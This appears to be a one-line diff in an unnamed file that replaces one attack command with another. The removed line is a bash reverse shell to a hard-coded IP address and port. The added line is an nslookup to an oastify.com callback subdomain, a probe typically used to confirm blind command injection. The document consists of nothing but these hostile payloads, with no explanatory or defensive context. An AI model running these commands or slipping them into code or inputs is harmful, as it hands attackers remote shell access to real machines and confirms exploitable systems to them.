@@ -1,1 +1,1 @@
-bash -i >& /dev/tcp/3.95.20.82/4001 0>&1;
+nslookup tolbztx27cdtdd2yiidypuqs7jda11pq.oastify.com
